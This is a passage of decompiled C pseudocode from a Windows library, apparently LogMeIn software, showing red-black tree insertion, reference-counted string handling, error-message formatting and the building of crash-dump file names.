    param_4[2] = param_6;
    if (param_4 == *(undefined4 **)(*param_1 + 8)) {
      *(int **)(*param_1 + 8) = param_6;
    }
  }
  else {
    *param_4 = param_6;
    if (param_4 == *(undefined4 **)*param_1) {
      *(int **)*param_1 = param_6;
    }
  }
  cVar2 = *(char *)(param_6[1] + 0xc);
  piVar5 = param_6;
  do {
    if (cVar2 != '\0') {
      *(undefined1 *)(*(int *)(*param_1 + 4) + 0xc) = 1;
      *param_2 = param_6;
      return;
    }
    piVar7 = (int *)piVar5[1];
    piVar6 = *(int **)piVar7[1];
    if (piVar7 == piVar6) {
      piVar6 = (int *)((undefined4 *)piVar7[1])[2];
      if ((char)piVar6[3] != '\0') {
        if (piVar5 == (int *)piVar7[2]) {
          piVar5 = (int *)piVar7[2];
          piVar7[2] = *piVar5;
          if (*(char *)(*piVar5 + 0xd) == '\0') {
            *(int **)(*piVar5 + 4) = piVar7;
          }
          piVar5[1] = piVar7[1];
          if (piVar7 == *(int **)(*param_1 + 4)) {
            *(int **)(*param_1 + 4) = piVar5;
          }
          else {
            piVar6 = (int *)piVar7[1];
            if (piVar7 == (int *)*piVar6) {
              *piVar6 = (int)piVar5;
            }
            else {
              piVar6[2] = (int)piVar5;
            }
          }
          *piVar5 = (int)piVar7;
          piVar7[1] = (int)piVar5;
          piVar5 = piVar7;
        }
        *(undefined1 *)(piVar5[1] + 0xc) = 1;
        *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
        piVar7 = *(int **)(piVar5[1] + 4);
        piVar6 = (int *)*piVar7;
        *piVar7 = piVar6[2];
        if (*(char *)(piVar6[2] + 0xd) == '\0') {
          *(int **)(piVar6[2] + 4) = piVar7;
        }
        piVar6[1] = piVar7[1];
        if (piVar7 == *(int **)(*param_1 + 4)) {
          *(int **)(*param_1 + 4) = piVar6;
          piVar6[2] = (int)piVar7;
        }
        else {
          piVar3 = (int *)piVar7[1];
          if (piVar7 == (int *)piVar3[2]) {
            piVar3[2] = (int)piVar6;
            piVar6[2] = (int)piVar7;
          }
          else {
            *piVar3 = (int)piVar6;
            piVar6[2] = (int)piVar7;
          }
        }
        goto LAB_1001e5ba;
      }
LAB_1001e511:
      *(undefined1 *)(piVar7 + 3) = 1;
      *(undefined1 *)(piVar6 + 3) = 1;
      *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
      piVar5 = *(int **)(piVar5[1] + 4);
    }
    else {
      if ((char)piVar6[3] == '\0') goto LAB_1001e511;
      if (piVar5 == (int *)*piVar7) {
        iVar1 = *piVar7;
        *piVar7 = *(int *)(iVar1 + 8);
        if (*(char *)(*(int *)(iVar1 + 8) + 0xd) == '\0') {
          *(int **)(*(int *)(iVar1 + 8) + 4) = piVar7;
        }
        *(int *)(iVar1 + 4) = piVar7[1];
        if (piVar7 == *(int **)(*param_1 + 4)) {
          *(int *)(*param_1 + 4) = iVar1;
        }
        else {
          piVar5 = (int *)piVar7[1];
          if (piVar7 == (int *)piVar5[2]) {
            piVar5[2] = iVar1;
          }
          else {
            *piVar5 = iVar1;
          }
        }
        *(int **)(iVar1 + 8) = piVar7;
        piVar7[1] = iVar1;
        piVar5 = piVar7;
      }
      *(undefined1 *)(piVar5[1] + 0xc) = 1;
      *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
      piVar7 = *(int **)(piVar5[1] + 4);
      piVar6 = (int *)piVar7[2];
      piVar7[2] = *piVar6;
      if (*(char *)(*piVar6 + 0xd) == '\0') {
        *(int **)(*piVar6 + 4) = piVar7;
      }
      piVar6[1] = piVar7[1];
      if (piVar7 == *(int **)(*param_1 + 4)) {
        *(int **)(*param_1 + 4) = piVar6;
      }
      else {
        piVar3 = (int *)piVar7[1];
        if (piVar7 == (int *)*piVar3) {
          *piVar3 = (int)piVar6;
        }
        else {
          piVar3[2] = (int)piVar6;
        }
      }
      *piVar6 = (int)piVar7;
LAB_1001e5ba:
      piVar7[1] = (int)piVar6;
    }
    cVar2 = *(char *)(piVar5[1] + 0xc);
  } while( true );
}



/* Function: FUN_1001e600 */

void __thiscall
FUN_1001e600(undefined4 *param_1,undefined4 *param_2,undefined4 param_3,int *param_4,
            undefined4 param_5)

{
  ushort uVar1;
  int iVar2;
  uint *puVar3;
  char cVar4;
  undefined **ppuVar5;
  uint uVar6;
  undefined4 **ppuVar7;
  undefined4 *puVar8;
  undefined **ppuVar9;
  int *extraout_ECX;
  undefined **ppuVar10;
  int *piVar11;
  int *piVar12;
  bool bVar13;
  undefined4 uVar14;
  int *piVar15;
  uint uStack_30;
  undefined4 *local_20;
  undefined4 local_1c;
  int *local_18;
  undefined1 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100754a0;
  local_10 = ExceptionList;
  uStack_30 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = (undefined1 *)&uStack_30;
  ExceptionList = &local_10;
  local_8 = 0;
  bVar13 = true;
  piVar15 = (int *)*param_1;
  local_1c = CONCAT31(local_1c._1_3_,1);
  piVar11 = piVar15;
  if (*(char *)(piVar15[1] + 0xd) == '\0') {
    piVar12 = (int *)piVar15[1];
    do {
      piVar11 = piVar12;
      iVar2 = piVar11[4];
      if ((iVar2 == 0) || (*(int *)(iVar2 + 8) == 0)) {
        ppuVar10 = &PTR_10083554;
      }
      else if (iVar2 == 0) {
        ppuVar10 = (undefined **)0x0;
      }
      else {
        ppuVar10 = (undefined **)(iVar2 + 0xc);
      }
      if (*param_4 == 0) {
        ppuVar5 = (undefined **)0x0;
      }
      else {
        ppuVar5 = (undefined **)(*param_4 + 0xc);
      }
      ppuVar9 = &PTR_10083554;
      if (ppuVar5 != (undefined **)0x0) {
        ppuVar9 = ppuVar5;
      }
      ppuVar5 = &PTR_10083554;
      if (ppuVar10 != (undefined **)0x0) {
        ppuVar5 = ppuVar10;
      }
      do {
        uVar1 = *(ushort *)ppuVar9;
        bVar13 = uVar1 < *(ushort *)ppuVar5;
        if (uVar1 != *(ushort *)ppuVar5) {
LAB_1001e6bb:
          uVar6 = -(uint)bVar13 | 1;
          goto LAB_1001e6c0;
        }
        if (uVar1 == 0) break;
        uVar1 = *(ushort *)((int)ppuVar9 + 2);
        bVar13 = uVar1 < *(ushort *)((int)ppuVar5 + 2);
        if (uVar1 != *(ushort *)((int)ppuVar5 + 2)) goto LAB_1001e6bb;
        ppuVar9 = ppuVar9 + 1;
        ppuVar5 = ppuVar5 + 1;
      } while (uVar1 != 0);
      uVar6 = 0;
LAB_1001e6c0:
      bVar13 = (int)uVar6 < 0;
      local_1c = CONCAT31(local_1c._1_3_,bVar13);
      if (bVar13) {
        piVar12 = (int *)*piVar11;
      }
      else {
        piVar12 = (int *)piVar11[2];
      }
    } while (*(char *)((int)piVar12 + 0xd) == '\0');
  }
  local_20 = param_1;
  local_18 = piVar11;
  puVar3 = &uStack_30;
  if (bVar13) {
    if (piVar11 == (int *)*piVar15) {
      ppuVar7 = &param_4;
      uVar14 = 1;
      local_14 = (undefined1 *)&uStack_30;
      goto LAB_1001e6fa;
    }
    FUN_10018180();
    puVar3 = (uint *)local_14;
  }
  local_14 = (undefined1 *)puVar3;
  piVar15 = local_18;
  cVar4 = FUN_1001d1f0(local_18 + 4,param_4);
  if (cVar4 == '\0') {
    FUN_1001df90(param_5);
    *param_2 = piVar15;
    *(undefined1 *)(param_2 + 1) = 0;
    ExceptionList = local_10;
    return;
  }
  ppuVar7 = &local_20;
  uVar14 = local_1c;
  piVar15 = extraout_ECX;
LAB_1001e6fa:
  puVar8 = (undefined4 *)FUN_1001e3b0(ppuVar7,uVar14,piVar11,piVar15,param_5);
  *param_2 = *puVar8;
  *(undefined1 *)(param_2 + 1) = 1;
  ExceptionList = local_10;
  return;
}



/* Function: Catch_All@1001e749 */

void Catch_All_1001e749(void)

{
  undefined4 *puVar1;
  int unaff_EBP;
  undefined4 unaff_ESI;
  
  FUN_1001df90(*(undefined4 *)(unaff_EBP + 0x14));
  FUN_1005de1b(0,0);
  FUN_1001df90();
  puVar1 = *(undefined4 **)(unaff_EBP + 8);
  *puVar1 = unaff_ESI;
  *(undefined1 *)(puVar1 + 1) = 0;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_1001e780 */

undefined4 * __thiscall FUN_1001e780(undefined4 *param_1,undefined4 param_2)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_100581b4(0x40e);
  if (puVar1 != (undefined4 *)0x0) {
    puVar1[1] = 0x200;
    *puVar1 = 0;
    puVar1[2] = 0;
    *(undefined2 *)(puVar1 + 3) = 0;
  }
  *param_1 = puVar1;
  param_1[1] = param_2;
  FUN_1001e820();
  return param_1;
}



/* Function: FUN_1001e7d0 */

undefined4 * __fastcall FUN_1001e7d0(undefined4 *param_1)

{
  undefined4 *puVar1;
  undefined4 extraout_ECX;
  undefined4 uVar2;
  
  puVar1 = (undefined4 *)FUN_100581b4(0x40e);
  uVar2 = extraout_ECX;
  if (puVar1 != (undefined4 *)0x0) {
    puVar1[1] = 0x200;
    uVar2 = 0;
    *puVar1 = 0;
    puVar1[2] = 0;
    *(undefined2 *)(puVar1 + 3) = 0;
  }
  *param_1 = puVar1;
  param_1[1] = 0;
  uVar2 = FUN_102cec00(uVar2);
  param_1[1] = uVar2;
  FUN_1001e820();
  return param_1;
}



/* Function: FUN_1001e820 */

int __fastcall FUN_1001e820(int *param_1)

{
  short sVar1;
  int *piVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  undefined4 extraout_ECX;
  short *psVar6;
  
  piVar2 = (int *)*param_1;
  iVar5 = param_1[1];
  iVar3 = FUN_10010370(0x201,1);
  *param_1 = iVar3;
  if (iVar3 == 0) {
    if (piVar2 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar2;
      *piVar2 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar2);
      }
    }
    if (*param_1 != 0) goto LAB_1001e860;
  }
  else {
LAB_1001e860:
    if (*param_1 != 0) {
      psVar6 = (short *)(*param_1 + 0xc);
      goto LAB_1001e86d;
    }
  }
  psVar6 = (short *)0x0;
LAB_1001e86d:
  *psVar6 = 0;
  uVar4 = FUN_105d0a4f(param_1,0x10ff,0,iVar5,0x400,psVar6,0x200,0);
  sVar1 = *psVar6;
  FUN_1000bca0(uVar4);
  if (sVar1 == 0) {
    iVar3 = FUN_1000bfa0(L"[no error description found]",0xffffffff);
    *param_1 = iVar3;
  }
  iVar3 = FUN_1000bfa0(&DAT_10084b78,0xffffffff);
  *param_1 = iVar3;
  iVar5 = FUN_1001e900(iVar5,extraout_ECX);
  *param_1 = iVar5;
  iVar5 = FUN_1000bfa0(&DAT_10084b80,0xffffffff);
  *param_1 = iVar5;
  if (iVar5 != 0) {
    return iVar5 + 0xc;
  }
  return 0;
}



/* Function: FUN_1001e900 */

int * __fastcall FUN_1001e900(int *param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
LAB_1001e984:
    uVar4 = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_1004b9c0(0);
      if (iVar1 == 0) {
        return param_1;
      }
      piVar2 = (int *)FUN_10010370(param_1[2] + iVar1,1);
      if (piVar2 == (int *)0x0) {
        return param_1;
      }
      goto LAB_1001e946;
    }
    if (param_1 == (int *)0x0) goto LAB_1001e984;
    uVar4 = param_1[1] - param_1[2];
  }
  uVar3 = FUN_1004b9c0(uVar4);
  if (uVar3 < uVar4) {
    param_1[2] = param_1[2] + uVar3;
    return param_1;
  }
  if (param_1 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = param_1[2];
  }
  piVar2 = (int *)FUN_10010290(iVar1 + uVar3);
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      *(undefined2 *)((int)param_1 + param_1[2] * 2 + 0xc) = 0;
    }
    return param_1;
  }
LAB_1001e946:
  iVar1 = FUN_1004b9c0(piVar2[1] - piVar2[2]);
  piVar2[2] = piVar2[2] + iVar1;
  return piVar2;
}



/* Function: FUN_1001e9f0 */

undefined4 * __thiscall
FUN_1001e9f0(undefined4 *param_1,int *param_2,undefined4 param_3,int *param_4)

{
  int *piVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  undefined4 uVar5;
  undefined4 extraout_ECX;
  int *local_30;
  int *local_24;
  int *local_20;
  void *local_10;
  undefined1 *puStack_c;
  undefined1 local_8;
  undefined3 uStack_7;
  
  puStack_c = &LAB_100754eb;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  local_8 = 1;
  uStack_7 = 0;
  param_1[2] = 0xffffffff;
  FUN_1001f080(param_1,L"\\LogMeIn",L"\\Dumps",1);
  local_8 = 2;
  FUN_1001ed50(uVar3);
  param_2 = (int *)0x0;
  local_8 = 3;
  iVar4 = (int)param_4;
  if ((int *)param_1[2] == param_4) {
    iVar4 = 0x6ce;
  }
  FUN_1001ee80(&param_2,L"-%04d-",iVar4);
  if (*local_30 == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = *local_30 + 0xc;
  }
  uVar5 = FUN_1000bdd0(iVar4,extraout_ECX);
  *param_1 = uVar5;
  uVar5 = FUN_1000bfa0(&DAT_1008401c,0xffffffff);
  *param_1 = uVar5;
  param_4 = (int *)0x0;
  _local_8 = CONCAT31(uStack_7,4);
  FUN_1001ebb0(&param_4,param_3);
  iVar4 = param_1[1];
  if ((iVar4 != 0) && (*(int *)(iVar4 + 8) != 0)) {
    uVar5 = FUN_1000bfa0(iVar4 + 0xc,*(undefined4 *)(iVar4 + 8));
    *param_1 = uVar5;
  }
  piVar1 = param_2;
  if ((param_2 != (int *)0x0) && (param_2[2] != 0)) {
    uVar5 = FUN_1000bfa0(param_2 + 3,param_2[2]);
    *param_1 = uVar5;
  }
  piVar2 = param_4;
  if ((param_4 != (int *)0x0) && (param_4[2] != 0)) {
    uVar5 = FUN_1000bfa0(param_4 + 3,param_4[2]);
    *param_1 = uVar5;
  }
  uVar5 = FUN_1000bfa0(L".dmp",0xffffffff);
  *param_1 = uVar5;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar2;
    *piVar2 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar1;
    *piVar1 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  if (local_20 != (int *)0x0) {
    LOCK();
    iVar4 = *local_20;
    *local_20 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_20);
    }
  }
  if (local_24 != (int *)0x0) {
    LOCK();
    iVar4 = *local_24;
    *local_24 = *local_24 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_24);
    }
  }
  FUN_1000b750();
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1001ebb0 */

int FUN_1001ebb0(undefined4 *param_1,undefined2 *param_2)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075518;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_14 = (int *)0x0;
  local_8 = 0;
  FUN_1001ee80(&local_14,L"%04d",*param_2,uVar3);
  if ((local_14 != (int *)0x0) && (local_14[2] != 0)) {
    uVar4 = FUN_1000bfa0(local_14 + 3,local_14[2]);
    *param_1 = uVar4;
  }
  FUN_1001ee80(&local_14,L"%02d",param_2[1],uVar3);
  if ((local_14 != (int *)0x0) && (local_14[2] != 0)) {
    uVar4 = FUN_1000bfa0(local_14 + 3,local_14[2]);
    *param_1 = uVar4;
  }
  FUN_1001ee80(&local_14,L"%02d",param_2[3],uVar3);
  if ((local_14 != (int *)0x0) && (local_14[2] != 0)) {
    uVar4 = FUN_1000bfa0(local_14 + 3,local_14[2]);
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(&DAT_10083be4,0xffffffff);
  *param_1 = uVar4;
  FUN_1001ee80(&local_14,L"%02d",param_2[4]);
  if ((local_14 != (int *)0x0) && (local_14[2] != 0)) {
    uVar4 = FUN_1000bfa0(local_14 + 3,local_14[2]);
    *param_1 = uVar4;
  }
  FUN_1001ee80(&local_14,L"%02d",param_2[5]);
  if ((local_14 != (int *)0x0) && (local_14[2] != 0)) {
    uVar4 = FUN_1000bfa0(local_14 + 3,local_14[2]);
    *param_1 = uVar4;
  }
  iVar5 = FUN_1001ee80(&local_14,L"%02d",param_2[6]);
  piVar2 = local_14;
  if (local_14 != (int *)0x0) {
    if (local_14[2] != 0) {
      uVar4 = FUN_1000bfa0(local_14 + 3,local_14[2]);
      *param_1 = uVar4;
    }
    LOCK();
    iVar1 = *piVar2;
    iVar5 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar5 = FUN_100579ee(piVar2);
    }
  }
  ExceptionList = local_10;
  return iVar5;
}



/* Function: FUN_1001ed50 */

void __fastcall FUN_1001ed50(undefined4 *param_1,undefined4 param_2)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  undefined4 uVar4;
  undefined4 extraout_ECX;
  int *piVar5;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075548;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8 = 0;
  piVar3 = (int *)FUN_10010370(0x105,1);
  if (piVar3 == (int *)0x0) {
    piVar5 = (int *)0x0;
  }
  else {
    piVar5 = piVar3 + 3;
  }
  if ((DAT_1009b554 & 1) == 0) {
    DAT_1009b554 = DAT_1009b554 | 1;
    FUN_1001aca0(uVar2);
    FUN_10057b51(&DAT_10078500);
  }
  if (DAT_1009b570 != (code *)0x0) {
    if ((DAT_1009b554 & 1) == 0) {
      DAT_1009b554 = DAT_1009b554 | 1;
      FUN_1001aca0(uVar2);
      FUN_10057b51(&DAT_10078500);
    }
    uVar4 = (*DAT_1009b570)(param_2,0,piVar5,0x104);
    FUN_1000bca0(uVar4);
    if (piVar3 != (int *)0x0) {
      LOCK();
      *piVar3 = *piVar3 + 1;
      UNLOCK();
    }
    uVar4 = FUN_1001efb0();
    uVar4 = FUN_1000bdd0(uVar4,extraout_ECX);
    *param_1 = uVar4;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar3;
    *piVar3 = *piVar3 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1001ee80 */

void FUN_1001ee80(undefined4 *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  uVar1 = FUN_1001eea0(param_2,&stack0x0000000c);
  *param_1 = uVar1;
  return;
}



/* Function: FUN_1001eea0 */

int * __thiscall FUN_1001eea0(int *param_1,undefined4 param_2,undefined4 param_3)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1 != (int *)0x0) {
    if (*param_1 == 0) {
      param_1[2] = 0;
      *(undefined2 *)(param_1 + 3) = 0;
      uVar4 = param_1[1];
      uVar1 = FUN_1004d090(param_2,param_3);
      if (uVar1 < uVar4) {
        param_1[2] = param_1[2] + uVar1;
        return param_1;
      }
      piVar2 = (int *)FUN_10010290(uVar1);
      if (piVar2 != (int *)0x0) {
        iVar3 = FUN_1004d090(param_2,param_3);
        piVar2[2] = piVar2[2] + iVar3;
        return piVar2;
      }
      return (int *)0x0;
    }
    LOCK();
    iVar3 = *param_1;
    *param_1 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  iVar3 = FUN_1004d090(param_2,param_3);
  if ((iVar3 != 0) && (iVar3 != -1)) {
    uVar4 = 0x10;
    if (0x10 < iVar3 + 1U) {
      uVar4 = iVar3 + 1U;
    }
    uVar4 = uVar4 + 0xf & 0xfffffff0;
    piVar2 = (int *)FUN_100581b4(uVar4 * 2 + 0xe);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined2 *)(piVar2 + 3) = 0;
      iVar3 = FUN_1004d090(param_2,param_3);
      piVar2[2] = piVar2[2] + iVar3;
      return piVar2;
    }
  }
  return (int *)0x0;
}



/* Function: FUN_1001efb0 */

int __fastcall FUN_1001efb0(int *param_1)

{
  int iVar1;
  int iVar2;
  uint *puVar3;
  undefined4 *puVar4;
  int *piVar5;
  int iVar6;
  int *local_18;
  uint local_14;
  uint local_10 [3];
  
  local_10[2] = 0x5c;
  local_10[1] = 0x2e;
  iVar1 = FUN_10010c00();
  iVar1 = iVar1 + 1;
  iVar2 = FUN_10010c00();
  piVar5 = (int *)*param_1;
  local_10[0] = iVar2 - iVar1;
  if (piVar5 == (int *)0x0) {
    iVar6 = 0;
  }
  else {
    iVar6 = piVar5[2];
  }
  local_14 = iVar6 - iVar1;
  puVar3 = local_10;
  if ((uint)(iVar6 - iVar1) <= (uint)(iVar2 - iVar1)) {
    puVar3 = &local_14;
  }
  if (*puVar3 != 0) {
    puVar4 = (undefined4 *)FUN_1000e640(&local_18,iVar1,*puVar3);
    iVar1 = FUN_10010440(*puVar4);
    *param_1 = iVar1;
    if (local_18 != (int *)0x0) {
      LOCK();
      iVar1 = *local_18;
      *local_18 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_18);
      }
    }
    goto LAB_1001f069;
  }
  if (piVar5 == (int *)0x0) {
LAB_1001f065:
    piVar5 = (int *)0x0;
  }
  else {
    if (*piVar5 != 0) {
      LOCK();
      iVar1 = *piVar5;
      *piVar5 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
      goto LAB_1001f065;
    }
    piVar5[2] = 0;
    *(undefined2 *)(piVar5 + 3) = 0;
  }
  *param_1 = (int)piVar5;
LAB_1001f069:
  if (*param_1 != 0) {
    return *param_1 + 0xc;
  }
  return 0;
}



/* Function: FUN_1001f080 */

undefined4 * __thiscall
FUN_1001f080(undefined4 *param_1,undefined4 param_2,short *param_3,short *param_4,undefined1 param_5
            )

{
  uint uVar1;
  undefined4 uVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_1007558e;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  local_8 = 0;
  if ((param_3 == (short *)0x0) || (*param_3 != 0)) {
    uVar2 = FUN_1000bd10(uVar1);
  }
  else {
    uVar2 = FUN_1000ba60();
  }
  param_1[3] = uVar2;
  if ((param_4 == (short *)0x0) || (*param_4 != 0)) {
    uVar2 = FUN_1000bd10(uVar1);
  }
  else {
    uVar2 = FUN_1000ba60();
  }
  param_1[4] = uVar2;
  local_8 = CONCAT31(local_8._1_3_,2);
  *(undefined1 *)(param_1 + 5) = param_5;
  FUN_1001faf0(0x23,0);
  FUN_1001faf0(0x1c,1);
  FUN_1001f140();
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1001f140 */

int ** __fastcall FUN_1001f140(int *param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int *piVar4;
  int iVar5;
  int **ppiVar6;
  uint uVar7;
  int iVar8;
  int iVar9;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075518;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_14 = param_1;
  if ((char)param_1[5] != '\0') {
    while( true ) {
      iVar9 = *param_1;
      iVar8 = 0;
      if (iVar9 == param_1[1]) break;
      while (iVar5 = FUN_1001f9a0(iVar8), iVar5 != 0) {
        iVar9 = iVar9 + 4;
        iVar8 = iVar8 + 1;
        if (iVar9 == param_1[1]) goto LAB_1001f1af;
      }
      FUN_1001fe20(&local_14,iVar9);
      if (param_1[1] - *param_1 >> 2 == 0) break;
    }
  }
LAB_1001f1af:
  ppiVar1 = (int **)param_1[1];
  ppiVar2 = (int **)*param_1;
  ppiVar6 = (int **)((int)ppiVar1 - (int)ppiVar2);
  if (((uint)ppiVar6 & 0xfffffffc) == 0) {
    local_14 = (int *)0x0;
    ppiVar6 = &local_14;
    local_8 = 0;
    if ((ppiVar6 < ppiVar1) && (ppiVar2 <= ppiVar6)) {
      ppiVar3 = (int **)param_1[2];
      iVar9 = (int)ppiVar6 - (int)ppiVar2;
      if ((ppiVar1 == ppiVar3) &&
         (ppiVar6 = (int **)((int)ppiVar3 - (int)ppiVar1 >> 2), ppiVar6 == (int **)0x0)) {
        uVar7 = (int)ppiVar3 - (int)ppiVar2 >> 2;
        if ((0x3fffffff - (uVar7 >> 1) < uVar7) || (iVar8 = uVar7 + (uVar7 >> 1), iVar8 == 0)) {
          iVar8 = 1;
        }
        ppiVar6 = (int **)FUN_1001ff10(iVar8);
      }
      if ((undefined4 *)param_1[1] != (undefined4 *)0x0) {
        ppiVar6 = (int **)*param_1;
        piVar4 = ppiVar6[iVar9 >> 2];
        *(undefined4 *)param_1[1] = piVar4;
        if (piVar4 != (int *)0x0) {
          LOCK();
          ppiVar6 = (int **)*piVar4;
          *piVar4 = *piVar4 + 1;
          UNLOCK();
        }
      }
    }
    else {
      ppiVar6 = (int **)param_1[2];
      if ((ppiVar1 == ppiVar6) && ((int)ppiVar6 - (int)ppiVar1 >> 2 == 0)) {
        uVar7 = (int)ppiVar6 - (int)ppiVar2 >> 2;
        if ((0x3fffffff - (uVar7 >> 1) < uVar7) || (iVar9 = uVar7 + (uVar7 >> 1), iVar9 == 0)) {
          iVar9 = 1;
        }
        FUN_1001ff10(iVar9);
      }
      ppiVar6 = (int **)param_1[1];
      if (ppiVar6 != (int **)0x0) {
        *ppiVar6 = (int *)0x0;
      }
    }
    param_1[1] = param_1[1] + 4;
  }
  ExceptionList = local_10;
  return ppiVar6;
}



/* Function: FUN_1001f2a0 */

/* WARNING: Removing unreachable block (ram,0x1001f952) */
/* WARNING: Removing unreachable block (ram,0x1001f95a) */

undefined4 * __thiscall
FUN_1001f2a0(undefined4 *param_1,undefined4 param_2,int *param_3,int *param_4)

{
  int iVar1;
  undefined1 uVar2;
  char cVar3;
  uint uVar4;
  undefined4 uVar5;
  int *piVar6;
  undefined **ppuVar7;
  int *piVar8;
  int iVar9;
  int *piVar10;
  undefined4 *puVar11;
  int extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  undefined4 extraout_ECX_12;
  undefined4 extraout_ECX_13;
  undefined4 extraout_ECX_14;
  wchar_t *pwVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  wchar_t *pwVar15;
  wchar_t *pwVar16;
  int local_3c;
  int *local_34;
  int local_28;
  int local_24;
  int *local_18;
  undefined4 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075622;
  local_10 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  local_8 = 0;
  local_14 = param_1;
  uVar5 = FUN_1000bd10(uVar4);
  param_1[3] = uVar5;
  uVar5 = FUN_1000bd10();
  param_1[4] = uVar5;
  *(undefined1 *)(param_1 + 5) = 1;
  piVar6 = (int *)*param_3;
  if (piVar6 != (int *)0x0) {
    LOCK();
    *piVar6 = *piVar6 + 1;
    UNLOCK();
  }
  local_8 = CONCAT31(local_8._1_3_,3);
  piVar6 = (int *)FUN_1000bfa0(&DAT_10083854,0xffffffff);
  iVar9 = *param_4;
  if ((iVar9 != 0) && (*(int *)(iVar9 + 8) != 0)) {
    piVar6 = (int *)FUN_1000bfa0(iVar9 + 0xc,*(undefined4 *)(iVar9 + 8));
    iVar9 = extraout_ECX;
  }
  if ((piVar6 == (int *)0x0) || (ppuVar7 = (undefined **)(piVar6 + 3), piVar6[2] == 0)) {
    ppuVar7 = &PTR_10083554;
  }
  piVar8 = (int *)FUN_10033a00(ppuVar7,iVar9);
  iVar9 = *piVar8;
  if (iVar9 == 0) {
    iVar9 = 1;
  }
  FUN_1001be20(iVar9);
  local_24 = 0;
  local_8._0_1_ = 4;
  param_4 = (int *)0x0;
  if (local_28 == 2) {
    piVar8 = (int *)FUN_1000bd10();
    param_3 = piVar8;
    iVar9 = FUN_1001d340(&param_3);
    if ((iVar9 == local_3c) ||
